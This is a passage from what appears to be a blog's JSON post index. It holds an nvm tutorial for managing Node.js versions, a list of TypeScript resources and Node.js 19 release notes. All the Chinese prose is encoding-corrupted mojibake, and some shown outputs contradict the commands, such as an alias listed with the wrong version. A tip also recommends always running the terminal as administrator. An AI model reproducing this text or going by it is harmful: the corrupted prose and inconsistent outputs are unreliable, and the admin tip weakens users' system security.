~/.npmrcï¼Œè«‹ç¢ºä¿è£¡é¢ä¸åŒ…å«ä»»ä½• prefix çš„è¨­å®š (å› ç‚ºèˆ‡ nvm ä¸ç›¸å®¹) ä½ å¯ä»¥ (ä½†ä¸æ‡‰è©²) ä¿ç•™ä»¥å‰åœ¨ \u0026ldquo;ç³»çµ±\u0026rdquo; å®‰è£çš„ Node.jsï¼Œä½† nvm åªå°ä½ çš„ä½¿ç”¨è€…å¸³æˆ¶ (ç”¨æ–¼å®‰è£ nvm çš„ä½¿ç”¨è€…å¸³æˆ¶) å¯ç”¨ã€‚å¯èƒ½æœƒå°è‡´ç‰ˆæœ¬ä¸ matchï¼Œå› ç‚ºå…¶ä»–ä½¿ç”¨è€…æœƒä½¿ç”¨ /usr/local/lib/node_modules/*ï¼Œè€Œä½¿ç”¨è€…å¸³æˆ¶æœƒä½¿ç”¨ ~/.nvm/versions/node/vX.X.X/lib/node_modules/* å¸¸ç”¨çš„ NVM æŒ‡ä»¤ ç›´æ¥è¼¸å…¥ nvm åŠå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„æŒ‡ä»¤åˆ—è¡¨ï¼Œåœ¨æ­¤åƒ…åˆ—å‡ºæœ€å¸¸è¦‹çš„å¹¾å€‹æŒ‡ä»¤ï¼ˆåŸºæœ¬ä¸Šå¸¸ç”¨çš„åªæœ‰å…©ä¸‰å€‹ï¼Œå‰©ä¸‹å¹¾å€‹åªè¦èªè­˜å³å¯ï¼‰\nversionï¼šç¢ºèª NVM æ˜¯å¦å®‰è£æˆåŠŸ (aliasï¼šv) Usageï¼š 1 2 3 nvm version # or nvm v æŸ¥çœ‹ NVM çš„ç‰ˆæœ¬ 1 2 $ nvm v 1.1.9 installï¼šåˆ©ç”¨ NVM å®‰è£ Node.js Usageï¼š 1 2 3 4 5 6 nvm install # or # {version} æ¬²å®‰è£çš„ Node.js ç‰ˆæœ¬ # {arch} æ¬²å®‰è£çš„ system archï¼š32ã€64ã€\u0026#34;all\u0026#34; (é è¨­ç‚ºç•¶å‰ç³»çµ±) nvm install \u0026lt;version\u0026gt; [arch] å®‰è£ NVM å¾Œï¼Œå…¶å¯¦é‚„æ²’å®‰è£ Node ç’°å¢ƒï¼š\n1 2 $ node zsh: command not found: node å¦‚æœåŸ·è¡Œä¸‹é¢æŒ‡ä»¤ï¼Œæœƒæé†’ä½ éœ€è¦åŸ·è¡Œ install æŒ‡ä»¤æ‰èƒ½å®‰è£ Node.jsï¼š\n1 2 3 4 $ nvm use node N/A: version \u0026#34;node -\u0026gt; N/A\u0026#34; is not yet installed. You need to run \u0026#34;nvm install node\u0026#34; to install it before using it. å®‰è£æœ€æ–°ç‰ˆçš„ Node.jsï¼š\n1 2 3 4 5 6 7 8 $ nvm install node Downloading and installing node v12.8.1... Downloading https://nodejs.org/dist/v12.8.1/node-v12.8.1-linux-x64.tar.xz... #################################################################################################### 100.0% Computing checksum with sha256sum Checksums matched! Now using node v12.8.1 (npm v6.10.2) Creating default alias: default -\u0026gt; node (-\u0026gt; v12.8.1) å¦‚æœè¦æŒ‡å®šå®‰è£ç‰ˆæœ¬ï¼Œå¯ä»¥ç›´æ¥æŒ‡å®šç‰ˆæœ¬è™Ÿ 1 $ nvm install 16.18.0 å®‰è£çš„ç¬¬ä¸€å€‹ç‰ˆæœ¬çš„ Node.js æœƒæˆç‚º nvm çš„é è¨­ç‰ˆæœ¬ï¼Œæ–°çš„ shell å°±æœƒä»¥é è¨­ç‰ˆæœ¬çš„ Node.js ä¾†ä½¿ç”¨ (ä¾‹å¦‚ï¼šnvm alias default)ã€‚\næŸ¥çœ‹ç›®å‰å®‰è£ Node.js çš„ç‰ˆæœ¬ï¼š\n1 2 $ node -v v16.18.0 uninstallï¼šåˆ©ç”¨ NVM è§£é™¤å®‰è£æŒ‡å®šçš„ Node.js ç‰ˆæœ¬ Usageï¼š 1 nvm uninstall \u0026lt;version\u0026gt; listï¼šæŸ¥çœ‹å¯ç”¨çš„å®‰è£ç‰ˆæœ¬ (aliasï¼šls) Usageï¼š 1 2 3 nvm list # or nvm ls nvm listï¼šæŸ¥çœ‹å·²å®‰è£çš„ç‰ˆæœ¬ nvm list installedï¼šæŸ¥çœ‹å·²å®‰è£çš„ç‰ˆæœ¬ nvm list availableï¼šæŸ¥çœ‹é ç«¯å¯å®‰è£çš„ç‰ˆæœ¬ æŸ¥çœ‹ç›®å‰ Node.js æœ‰å“ªäº›å¯ç”¨ç‰ˆæœ¬å¯å®‰è£ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 $ nvm ls available | CURRENT | LTS | OLD STABLE | OLD UNSTABLE | |--------------|--------------|--------------|--------------| | 19.0.0 | 18.12.0 | 0.12.18 | 0.11.16 | | 18.11.0 | 16.18.0 | 0.12.17 | 0.11.15 | | 18.10.0 | 16.17.1 | 0.12.16 | 0.11.14 | | 18.9.1 | 16.17.0 | 0.12.15 | 0.11.13 | | 18.9.0 | 16.16.0 | 0.12.14 | 0.11.12 | | 18.8.0 | 16.15.1 | 0.12.13 | 0.11.11 | | 18.7.0 | 16.15.0 | 0.12.12 | 0.11.10 | | 18.6.0 | 16.14.2 | 0.12.11 | 0.11.9 | | 18.5.0 | 16.14.1 | 0.12.10 | 0.11.8 | | 18.4.0 | 16.14.0 | 0.12.9 | 0.11.7 | | 18.3.0 | 16.13.2 | 0.12.8 | 0.11.6 | | 18.2.0 | 16.13.1 | 0.12.7 | 0.11.5 | | 18.1.0 | 16.13.0 | 0.12.6 | 0.11.4 | | 18.0.0 | 14.20.1 | 0.12.5 | 0.11.3 | | 17.9.1 | 14.20.0 | 0.12.4 | 0.11.2 | | 17.9.0 | 14.19.3 | 0.12.3 | 0.11.1 | | 17.8.0 | 14.19.2 | 0.12.2 | 0.11.0 | | 17.7.2 | 14.19.1 | 0.12.1 | 0.9.12 | | 17.7.1 | 14.19.0 | 0.12.0 | 0.9.11 | | 17.7.0 | 14.18.3 | 0.10.48 | 0.9.10 | é€šå¸¸æœƒé¸æ“‡å®‰è£ LTS (Long-term supportï¼Œé•·æœŸæ”¯æ´) ç‰ˆ\næŸ¥çœ‹ç›®å‰å·²å®‰è£çš„ç‰ˆæœ¬ 1 2 3 $ nvm ls * 16.18.0 (Currently using 64-bit executable) 14.18.0 useï¼šåˆ‡æ› Node.js ç‰ˆæœ¬ Usageï¼š 1 2 3 4 5 6 nvm use # or # {version} æ¬²åˆ‡æ›çš„ Node.js ç‰ˆæœ¬ # {arch} æ¬²åˆ‡æ›çš„ system archï¼š32ã€64ã€\u0026#34;all\u0026#34; (é è¨­ç‚ºç•¶å‰ç³»çµ±) nvm use \u0026lt;version\u0026gt; [arch] å¦‚æœè¦ä½¿ç”¨ nvm åˆ‡æ›æ­£åœ¨ä½¿ç”¨çš„ Node.js ç‰ˆæœ¬ï¼Œå¯ç”¨ use æŒ‡ä»¤ 1 nvm use v16.18.0 å¦‚æœåˆ‡æ›çš„ç›®æ¨™ç‰ˆæœ¬é‚„æ²’å®‰è£ï¼Œnvm æœƒæé†’ä½ è¦å®‰è£ï¼š\n1 2 $ nvm use v14.18.0 node v14.18.0 (64-bit) is not installed. é€é nvm å®‰è£ Node.js æ™‚ï¼Œnvm æœƒå°‡ä¸åŒçš„ Node.js ç‰ˆæœ¬å„²å­˜åœ¨ ~/.nvm/versions/node/vX.X.Xï¼Œç„¶å¾Œå†ä¿®æ”¹ $PATHï¼Œå°‡æŒ‡å®šç‰ˆæœ¬çš„ Node.js è·¯å¾‘åŠ å…¥ï¼š\n1 2 3 4 5 6 7 8 9 10 $ nvm current v10.16.3 $ echo $PATH /home/titan/.nvm/versions/node/v10.16.3/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin $ use v12.13.1 $ nvm current v12.13.1 $ echo $PATH /home/titan/.nvm/versions/node/v12.13.1/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin åœ¨ nvm çš„å„å€‹ Node.js ç‰ˆæœ¬å®‰è£çš„å…¨åŸŸå¥—ä»¶éƒ½æœƒåœ¨å„è‡ªç‰ˆæœ¬çš„ç›®éŒ„å…§å®‰è£ï¼Œæ‰€ä»¥åœ¨åˆ‡æ›è‡³æ–°å®‰è£çš„ Node.js ç‰ˆæœ¬å¾Œéœ€è¦é‡æ–°å®‰è£ï¼Œä¹Ÿå› ç‚ºå¦‚æ­¤ï¼Œä¸åŒç‰ˆæœ¬é–“çš„å¥—ä»¶å°±ä¸æœƒæœ‰è¡çªå•é¡Œã€‚\ncurrentï¼šæŸ¥çœ‹ç›®å‰ä½¿ç”¨çš„ç‰ˆæœ¬ Usageï¼š 1 nvm current å¦‚æœå¿˜è¨˜è‡ªå·±åˆ‡æ›åˆ°å“ªå€‹ç‰ˆæœ¬ï¼Œå¯ä»¥ç”¨ current æŒ‡ä»¤ 1 2 $ nvm current v16.18.0 runï¼šç›´æ¥åŸ·è¡Œ Node.js (NVM 1.1.9ç‰ˆå·²æ‹”é™¤) å¦‚æœè¦ç›´æ¥åŸ·è¡Œ Node.jsï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢æŒ‡ä»¤ 1 2 3 4 5 $ nvm run node Running node v16.18.0 (npm v8.19.2) Welcome to Node.js v16.18.0. Type \u0026#34;.help\u0026#34; for more information. \u0026gt; execï¼šæŒ‡å®šè¦åŸ·è¡Œçš„ Node.js ç‰ˆæœ¬ (NVM 1.1.9ç‰ˆå·²æ‹”é™¤) 1 2 3 4 5 $ nvm exec 12.8.1 node Running node v12.8.1 (npm v6.10.2) Welcome to Node.js v12.8.1. Type \u0026#34;.help\u0026#34; for more information. \u0026gt; whichï¼šå¯Ÿçœ‹ Node.js çš„å®‰è£è·¯å¾‘ (NVM 1.1.9ç‰ˆå·²æ‹”é™¤) åŸ·è¡Œä¸‹é¢æŒ‡ä»¤å¯ä»¥æŸ¥çœ‹ç‰¹å®šç‰ˆæœ¬çš„ Node.js çš„å®‰è£è·¯å¾‘ 1 2 $ nvm which 12.8.1 /home/titan/.nvm/versions/node/v12.8.1/bin/node aliasï¼šæŸ¥çœ‹åˆ¥åã€è¨­å®šåˆ¥å Usageï¼š 1 2 3 4 5 6 7 8 9 10 11 12 $ nvm alias default -\u0026gt; v10.16.3 node -\u0026gt; stable (-\u0026gt; v12.8.1) (default) stable -\u0026gt; 12.8 (-\u0026gt; v12.8.1) (default) iojs -\u0026gt; N/A (default) unstable -\u0026gt; N/A (default) lts/* -\u0026gt; lts/erbium (-\u0026gt; N/A) lts/argon -\u0026gt; v4.9.1 (-\u0026gt; N/A) lts/boron -\u0026gt; v6.17.1 (-\u0026gt; N/A) lts/carbon -\u0026gt; v8.16.2 (-\u0026gt; N/A) lts/dubnium -\u0026gt; v10.17.0 (-\u0026gt; N/A) lts/erbium -\u0026gt; v12.13.0 (-\u0026gt; N/A) å¦‚ä¸‹åœ–æœ‰äº›ç‰ˆæœ¬çš„æ–‡å­—æ˜¯ç´…è‰²æˆ–æ˜¯é¡¯ç¤º N/Aï¼Œå°±ä»£è¡¨è©²ç‰ˆæœ¬æœªåœ¨é›»è…¦å®‰è£ é è¨­ alias å¯ä»¥å–ä»£ç‰ˆæœ¬è™Ÿ nodeï¼šå®‰è£æœ€æ–°ç‰ˆçš„ Node.js iojsï¼šå®‰è£æœ€æ–°ç‰ˆçš„ io.js stableï¼šæ­¤ alias å·²æ£„ç”¨ï¼Œåƒ…é©ç”¨æ–¼ v0.12 ä»¥åŠæ›´èˆŠç‰ˆï¼Œç›®å‰æ”¹ç‚º node alias unstableï¼šæ­¤ alias ç‚º v0.11ï¼Œæœ€å¾Œä¸€å€‹ â€œunstableâ€ (ä¸ç©©å®š) Node releaseï¼Œåœ¨ v1.0 ä¹‹å¾Œçš„ç‰ˆæœ¬éƒ½æ˜¯ç©©å®šç‰ˆ (in SemVer, versions communicate breakage, not stability) å¯åœ¨ä¸‹é¢é€™äº›æŒ‡ä»¤ä½¿ç”¨ä»¥ä¸Šé è¨­åˆ¥åï¼š\nnvm install nvm use nvm run nvm exec nvm which â€¦ ç­‰ è¨­å®šåˆ¥å 1 2 $ nvm alias v16-test v16.18.0 v16-test -\u0026gt; v16.18.0 æ¥è‘—ç”¨ nvm alias æŒ‡ä»¤å°±æœƒçœ‹åˆ°å‰›å‰›æ–°å¢çš„åˆ¥åæ‰€å°æ‡‰çš„ Node.js ç‰ˆæœ¬ 1 2 3 4 5 6 7 8 9 10 11 12 13 $ nvm alias v16-test -\u0026gt; v10.15.3 default -\u0026gt; v10.16.3 node -\u0026gt; stable (-\u0026gt; v12.8.1) (default) stable -\u0026gt; 12.8 (-\u0026gt; v12.8.1) (default) iojs -\u0026gt; N/A (default) unstable -\u0026gt; N/A (default) lts/* -\u0026gt; lts/erbium (-\u0026gt; N/A) lts/argon -\u0026gt; v4.9.1 (-\u0026gt; N/A) lts/boron -\u0026gt; v6.17.1 (-\u0026gt; N/A) lts/carbon -\u0026gt; v8.16.2 (-\u0026gt; N/A) lts/dubnium -\u0026gt; v10.17.0 (-\u0026gt; N/A) lts/erbium -\u0026gt; v12.13.0 (-\u0026gt; N/A) å¸¸è¦‹éŒ¯èª¤åŸå›  å ±éŒ¯ exit status 1(æˆ– exit status 5) å•é¡Œ å‡ºç¾ exit status 1 å­˜å–è¢«æ‹’ æˆ– exit status 5 å­˜å–è¢«æ‹’ï¼Œéœ€è¦ç”¨ç®¡ç†å“¡èº«åˆ†æ‰“é–‹ cmd å‘½ä»¤åˆ—å·¥å…·ï¼Œå†åŸ·è¡Œ nvm use \u0026lt;version\u0026gt; å³å¯ã€‚\nå ±éŒ¯ exit status 145 å•é¡Œ é€™å€‹å•é¡Œå¯ä»¥åœ¨ github nvm-windows ä¸‹æ‰¾åˆ°ç­”æ¡ˆï¼Œnvm å®‰è£çš„æ™‚å€™æœ‰å…©å€‹å®‰è£ç›®éŒ„ï¼Œä¸€å€‹æ˜¯ nvm å®‰è£ç›®éŒ„ï¼Œä¸€å€‹æ˜¯ nodejs å®‰è£ç›®éŒ„ï¼Œé€™å…©å€‹å®‰è£ç›®éŒ„åä¸èƒ½å‡ºç¾ç©ºæ ¼æˆ–ä¸­æ–‡ï¼Œä½†æ˜¯ nodejs é»˜èªå®‰è£ç›®éŒ„æ˜¯ C:\\Program Files\\nodejsï¼Œé€™å€‹ç›®éŒ„ä¸­é–“æœ‰ç©ºæ ¼ï¼Œéœ€è¦æˆ‘å€‘è‡ªå®šç¾©ä¸€å€‹å®‰è£ç›®éŒ„ï¼Œå³å¯è§£æ±ºé€™å€‹å•é¡Œã€‚\nBONUSï¼šæ°¸é ä»¥ç³»çµ±ç®¡ç†è€…èº«ä»½åŸ·è¡Œ æ¯æ¬¡éƒ½è¦ä½¿ç”¨ã€Œä»¥ç³»çµ±ç®¡ç†è€…èº«ä»½åŸ·è¡Œã€ä¾†é–‹å•Ÿçµ‚ç«¯æ©Ÿæ˜¯çœŸçš„æ»¿éº»ç…©çš„ï¼Œæ‰€ä»¥ä½ å…¶å¯¦å¯ä»¥é‡å°æ‡‰ç”¨ç¨‹å¼æ°¸é ã€Œä»¥ç³»çµ±ç®¡ç†è€…èº«ä»½åŸ·è¡Œã€ï¼Œé¦–å…ˆé»ä½ è¦æ°¸é åŸ·è¡Œçš„ç¨‹å¼å³éµé¸å…§å®¹\né»é¸ä¸‹æ–¹é€²éš\nå°‡ã€Œä»¥ç³»çµ±ç®¡ç†å“¡èº«ä»½åŸ·è¡Œã€æ‰“å‹¾\næå®šï¼Œä¹‹å¾Œä½¿ç”¨æ·å¾‘æ‰“é–‹ cmd æ™‚ï¼Œçš†ç‚ºã€Œä»¥ç³»çµ±ç®¡ç†å“¡èº«ä»½åŸ·è¡Œã€\nç¸½çµ nvm æŒ‡ä»¤æ•´ç†\næŒ‡ä»¤ åŠŸèƒ½ nvm versionnvm v æŸ¥çœ‹ nvm ç‰ˆæœ¬ nvm install \u0026lt;version\u0026gt; å®‰è£æŒ‡å®š \u0026lt;version\u0026gt; ç‰ˆæœ¬çš„ Node.js(å»ºè­°å®‰è£ LTS ç‰ˆæœ¬) nvm lsnvm ls installed æŸ¥çœ‹ç›®å‰å·²å®‰è£çš„ Node.js ç‰ˆæœ¬ nvm ls available æŸ¥çœ‹ç›®å‰å¯å®‰è£çš„ Node.js ç‰ˆæœ¬ nvm use \u0026lt;version\u0026gt; åˆ‡æ›æŒ‡å®š \u0026lt;version\u0026gt; ç‰ˆæœ¬çš„ Node.js nvm current æŸ¥çœ‹ç•¶å‰ä½¿ç”¨çš„ Node.js ç‰ˆæœ¬ ","date":"2022-10-27T00:00:00Z","image":"https://live.staticflickr.com/65535/52457342886_5035af0537_o.png","permalink":"https://wayneblog.ga/2022-10-27/nodejs-nvm/","title":"nvm - Nodejs ç‰ˆæœ¬éš¨ä½ åˆ‡æ›"},{"content":" åƒè€ƒç¶²ç«™\nTypeScript æ˜¯å¾®è»Ÿé–‹ç™¼çš„ä¸€å€‹é–‹æºçš„ç·¨ç¨‹èªè¨€ï¼Œé€šéåœ¨ JavaScript çš„åŸºç¤ä¸Šæ·»åŠ éœæ…‹é¡å‹å®šç¾©æ§‹å»ºè€Œæˆã€‚TypeScript é€šé TypeScript ç·¨è­¯å™¨æˆ– Babel è½‰è­¯çˆ² JavaScript ä»£ç¢¼ï¼Œå¯é‹è¡Œåœ¨ä»»ä½•ç€è¦½å™¨å’Œæ“ä½œç³»çµ±ã€‚ä¸‹é¢ä¾†åˆ†äº« 10 å€‹å€¼å¾—å­¸ç¿’çš„ TypeScript å¯¶åº«ï¼\nTypeScript å®˜æ–¹æ–‡æª” TypeScript å®˜æ–¹æ–‡æª”ï¼Œæä¾›äº†ä¸­æ–‡ç‰ˆæœ¬ã€‚\nGithubï¼šhttps://github.com/microsoft/TypeScript\nå­¸ç¿’ TypeScript é»æˆ‘å‰å¾€\nå¯èƒ½æ˜¯ä¸­åœ‹æœ€å¥½çš„ TypeScript å…¥é–€åˆ°é€²éšç³»çµ±æ•™ç¨‹ã€‚\nGithubï¼šhttps://github.com/mqyqingfeng/learn-typescript\nTypeScript ä½¿ç”¨æŒ‡å—æ‰‹å†Š é»æˆ‘å‰å¾€\nTypeScript ä½¿ç”¨æ‰‹å†Šï¼ˆä¸­æ–‡ç‰ˆï¼‰ç¿»è­¯ã€‚\nGithubï¼šhttps://github.com/zhongsp/TypeScript\næ·±å…¥ç†è§£ TypeScript é»æˆ‘å‰å¾€\nTypeScript Deep Dive ä¸­æ–‡ç‰ˆã€‚\nGithubï¼šhttps://github.com/jkchao/typescript-book-chinese\nTypeScript å…¥é–€æ•™ç¨‹ é»æˆ‘å‰å¾€\nå¾ JavaScript ç¨‹åºå“¡çš„è§’åº¦ç¸½çµæ€è€ƒï¼Œå¾ªåºæ¼¸é€²åœ°ç†è§£ TypeScriptã€‚\nGithubï¼šhttps://github.com/xcatliu/typescript-tutorial\nTypeScript é¡å‹æŒ‘æˆ° é»æˆ‘å‰å¾€\né«˜è³ªé‡çš„é¡å‹å¯ä»¥æé«˜é …ç›®çš„å¯ç¶­è­·æ€§ä¸¦é¿å…ä¸€äº›æ½›åœ¨çš„æ¼æ´ã€‚æœ¬é …ç›®æ„åœ¨æ–¼è®“ä½ æ›´å¥½åœ°ç­è§£ TS çš„é¡å‹ç³»çµ±ï¼Œç·¨å¯«ä½ è‡ªå·±çš„é¡å‹å·¥å…·ï¼Œæˆ–è€…åªæ˜¯å–®ç´”çš„äº«å—æŒ‘æˆ°çš„æ¨‚è¶£ï¼\nGithubï¼šhttps://github.com/type-challenges/type-challenges\nDefinitelyTyped DefinitelyTyped åŒ…å«å¤§é‡çš„é«˜è³ªé‡çš„ TypeScript é¡å‹å®šç¾©ã€‚é€šéä½¿ç”¨ DefinitelyTyped åŠå…¶åŒ…å«çš„è²æ˜æ–‡ä»¶ï¼Œæˆ‘å€‘å¯ä»¥ä½¿ç”¨å¤§å¤šæ•¸æµè¡Œçš„ JavaScript åº«ï¼Œå°±åƒå®ƒå€‘æ˜¯ TypeScript åº«ä¸€æ¨£ï¼Œå°‡é€šéç·¨è­¯å™¨é€²è¡Œé¡å‹é©—è­‰ã€‚\nGithubï¼šhttps://github.com/DefinitelyTyped/DefinitelyTyped\nreact-redux-typescript-guide é»æˆ‘å‰å¾€\næœ¬æŒ‡å—è¨˜éŒ„äº†æœ‰é—œåœ¨ Reactï¼ˆåŠå…¶ç”Ÿæ…‹ç³»çµ±ï¼‰ä¸­ä»¥å‡½æ•¸å¼é¢¨æ ¼ä½¿ç”¨ TypeScript çš„æ¨¡å¼å’Œç¥•è¨£ã€‚å®ƒå°‡ä½¿ä»£ç¢¼é¡å‹å®‰å…¨ï¼ŒåŒæ™‚å°ˆæ³¨æ–¼å¾å¯¦ç¾ä¸­æ¨æ–·é¡å‹ï¼Œå¾é•·é ä¾†çœ‹æ›´å®¹æ˜“ç·¨å¯«å’Œç¶­è­·æ­£ç¢ºçš„é¡å‹ã€‚\nGithubï¼šhttps://github.com/piotrwitek/react-redux-typescript-guide\nReact+TypeScript å‚™å¿˜éŒ„ é»æˆ‘å‰å¾€\nå°ˆæ³¨æ–¼å¹«åŠ© React é–‹ç™¼äººå“¡åœ¨ React æ‡‰ç”¨ä¸­ä½¿ç”¨ TypeScriptã€‚\nGithubï¼šhttps://github.com/typescript-cheatsheets/react\nclean-code-typescript é»æˆ‘å‰å¾€\nå°‡ Clean Code çš„æ¦‚å¿µé©ç”¨åˆ° TypeScriptï¼Œå¼•å°è®€è€…ä½¿ç”¨ TypeScript ç·¨å¯«æ˜“è®€ã€å¯æ“´å±•çš„æ‡‰ç”¨ã€‚\nGithubï¼šhttps://github.com/labs42io/clean-code-typescript\nè°·æ­Œ TypeScript é¢¨æ ¼æŒ‡å— é»æˆ‘å‰å¾€\nGoogle TypeScript é¢¨æ ¼æŒ‡å—ã€‚\nGithubï¼šhttps://google.github.io/styleguide/tsguide.html\nAwesome TypeScript é»æˆ‘å‰å¾€\nå¾ˆæ£’çš„ TypeScript è³‡æºã€‚\nGithubï¼šhttps://github.com/semlinker/awesome-typescript\n","date":"2022-10-27T00:00:00Z","image":"https://live.staticflickr.com/65535/52458187213_d3e26e7c48_o.png","permalink":"https://wayneblog.ga/2022-10-27/ts-learning-12-website/","title":"æ¨è–¦ 12 å€‹å€¼å¾—å­¸ç¿’çš„ TypeScript å¯¶åº«ï¼"},{"content":" åƒè€ƒç¶²ç«™\nåƒè€ƒç¶²ç«™\nNode.js 19 åœ¨ 2022-10-18 æ­£å¼ç™¼å¸ƒäº†ï¼Œæ­¤æ¬¡æ›´æ–°åŒ…æ‹¬å°‡ V8 JavaScript å¼•æ“æ›´æ–°åˆ° 10.7ï¼Œä»¥åŠé»˜èªå•Ÿç”¨ HTTP (s)/1.1 KeepAliveã€‚\nNode.js 18 åœ¨æœ¬æœˆæ™šäº›æ™‚å€™å°‡é€²å…¥é•·æœŸæ”¯æŒï¼ˆLTSï¼‰ï¼ŒNode.js 19 å°‡å–ä»£ Node.js 18 æˆç‚º \u0026ldquo;Current\u0026rdquo; ç‰ˆæœ¬ã€‚\nå®˜æ–¹æ–‡æª” node \u0026ndash;watch (å¯¦é©—æ€§) é‹è¡Œæ™‚ï¼Œå¢åŠ äº†ä¸€å€‹ä»¤äººèˆˆå¥®çš„åŠŸèƒ½ï¼Œæ”¯æŒä½¿ç”¨ node --watchï¼Œé¸é …åœ¨ \u0026ldquo;watch\u0026rdquo; æ¨¡å¼ä¸‹é‹è¡Œã€‚åœ¨ \u0026ldquo;watch\u0026rdquo; æ¨¡å¼ä¸‹é‹è¡Œï¼Œç•¶å°å…¥çš„æ–‡ä»¶è¢«æ”¹è®Šæ™‚ï¼Œæœƒé‡æ–°å•Ÿå‹•é€²ç¨‹ã€‚\n1 node --watch index.js æ­¤åŠŸèƒ½åœ¨ v19.0.0 å’Œ v18.11.0+ ä¸­å¯ç”¨ã€‚\né»˜èªå•Ÿç”¨ HTTP(S)/1.1 KeepAlive å¾é€™å€‹ç‰ˆæœ¬é–‹å§‹ï¼ŒNode.js é»˜èªå°‡ keepAlive è¨­ç½®ç‚º trueï¼Œé€™æ„å‘³è‘—ä»»ä½•å‡ºç«™çš„ HTTP (s) é€£ç·šå°‡è‡ªå‹•ä½¿ç”¨ HTTP 1.1 Keep-Aliveã€‚é»˜èªçš„ keep-alive æ™‚é–“æ˜¯ 5 ç§’ã€‚\nå•Ÿç”¨ keep-alive å°‡æä¾›æ›´å¥½çš„ååé‡ï¼Œå› ç‚ºé€£æ¥åœ¨é»˜èªæƒ…æ³ä¸‹è¢«é‡è¤‡ä½¿ç”¨ã€‚\nç©©å®šçš„ WebCrypto WebCrypto API ç¾åœ¨å·²ç¶“ç©©å®šï¼ˆä»¥ä¸‹ç®—æ³•é™¤å¤–ï¼šEd25519ã€Ed448ã€X25519 å’ŒX448)\nä½¿ç”¨ globalThis.crypto æˆ– require('node:crypto').webcrypto ä¾†è¨ªå•é€™å€‹æ¨¡å¡Šã€‚\nè‡ªå®šç¾© ESM Resolution èª¿æ•´ Node.js å·²ç¶“åˆªé™¤äº† --experimental-specifier-resolution æ¨™èªŒï¼Œå…¶åŠŸèƒ½ç¾åœ¨å¯ä»¥é€šéè‡ªå®šç¾©åŠ è¼‰å™¨å¯¦ç¾ã€‚\nç§»é™¤ DTrace/SystemTap/ETW æ”¯æŒ å° DTrace/SystemTap/ETW çš„æ”¯æŒåœ¨ v19.0.0 ä¸­è¢«ç§»é™¤ï¼Œä¸»è¦åŸå› æ˜¯è³‡æºçš„å„ªå…ˆç´šå•é¡Œã€‚\nå¦‚æœä½ æœ‰èˆˆè¶£å¹«åŠ©æ¢å¾© DTraceï¼Œå¯ä»¥æŸ¥çœ‹è©² issueï¼šhttps://github.com/nodejs/node/issues/44550ã€‚\nä¾è³´ V8 10.7 V8 å¼•æ“å·²ç¶“æ›´æ–°åˆ° 10.7 ç‰ˆæœ¬ï¼Œé€™æ˜¯ Chromium 107 çš„ä¸€éƒ¨åˆ†ã€‚é€™å€‹ç‰ˆæœ¬åŒ…æ‹¬äº† JavaScript API çš„ä¸€å€‹æ–°ç‰¹æ€§ï¼šIntl.NumberFormatã€‚\nIntl.NumberFormatv3 API æ˜¯ä¸€å€‹æ–°çš„ TC39 ECMA402 ç¬¬ä¸‰éšæ®µææ¡ˆï¼Œæ“´å±•äº†å…ˆå‰å­˜åœ¨çš„ Intl.NumberFormatã€‚\nllhttp Node.js 19 æ­è¼‰äº† llhttp@8.1.0\nnpm Node.js 19 æ­è¼‰äº† npm@8.19.2\nNode.js 18 å°‡é€²å…¥ LTS Node.js 18 ç³»åˆ—å°‡åœ¨ä¸‹é€±éæ¸¡åˆ°é•·æœŸæ”¯æŒç‰ˆæœ¬ã€‚\nç”Ÿå‘½é€±æœŸ Node.js 14 å°‡åœ¨ 2023 å¹´ 4 æœˆé”åˆ°ç”Ÿå‘½é€±æœŸçµæŸï¼Œå› æ­¤å»ºè­°ç”¨æˆ¶é–‹å§‹è¨ˆåŠƒå‡ç´šåˆ° Node.js 16ï¼ˆLTSï¼‰æˆ– Node.js 18ï¼ˆLTSï¼‰ã€‚\nNode.js 16 (LTS) å°‡åœ¨ 2023 å¹´ 9 æœˆé”åˆ°ç”Ÿå‘½é€±æœŸçµæŸï¼Œæ¯”åŸè¨ˆåŠƒ 2024 å¹´ 4 æœˆæå‰äº†ã€‚\næ›´å¤šè©³æƒ…å¯æŸ¥çœ‹ï¼šhttps://nodejs.org/en/blog/announcements/v19-release-announce/\nè£œå……ï¼š Nodejs 16 çš„æ–°ç‰¹æ€§ åŸæ–‡ç¶²å€ï¼šhttps://weekly.shanyue.tech/release/node-16/\nNode 16 æ–¼å››æœˆäºŒåæ—¥ç™¼å¸ƒï¼Œå±±æœˆåœ¨ç¬¬ä¸€æ™‚é–“ä¸‹è¼‰äº†Node16 é«”é©—äº†ä»¥ä¸‹æ–°ç‰¹æ€§ã€‚å¶æ•¸è™Ÿçš„ç‰ˆæœ¬ç‚ºLTS ç‰ˆæœ¬ï¼Œé€™å°‡æ˜¯æ—¢Node14 ä¹‹å¾Œçš„ä¸‹ä¸€å€‹é•·æœŸæ”¯æŒç‰ˆæœ¬ï¼ŒNode14 åœ¨2020-10-27 å·²é€²å…¥ Active LTS éšæ®µï¼Œé‚„æ²’æœ‰å‡ç´šçš„åŒå­¸è¦ç›¡é‡æ›´æ–°å‘€ã€‚\nå¾ Node 16 Release å®˜æ–¹æ–‡æª” åˆ—å‡ºäº†æ­¤æ¬¡å®ƒæ‰€æœ‰çš„æ–°ç‰¹æ€§ä»¥åŠéå¸¸è©³ç´°çš„æäº¤è¨˜éŒ„ã€‚é‚£å®ƒåˆ°åº•æ›´æ–°äº†å“ªäº›æ–°ç‰¹æ€§ï¼Œå…ˆè®“æˆ‘å€‘ä¸€ç¹ç‚ºå¿«å§ï¼\nTimers Promise API Timers Promise API å…¶å¯¦åœ¨ Node 15 å°±å·²å­˜åœ¨ï¼Œé‚£æ™‚å€™æ˜¯ä¸€å€‹å¯¦é©—ç‰¹æ€§ï¼Œç›®å‰å·²é€²å…¥äº†ç©©å®šéšæ®µï¼Œæ˜¯ä¸€é …ä»¤äººèˆˆå¥®çš„ç‰¹æ€§ã€‚é‚£å®ƒåˆ°åº•æ˜¯å¹¹ä»€éº¼ç”¨çš„å‘¢ï¼Ÿ\nå…ˆåˆ¥æ€¥ï¼Œåœ¨æ­¤ä¹‹å‰ï¼Œå…ˆçœ‹ä¸€å€‹å•é¡Œï¼šå¦‚ä½•å¯¦ç¾ä¸€å€‹sleep/delay 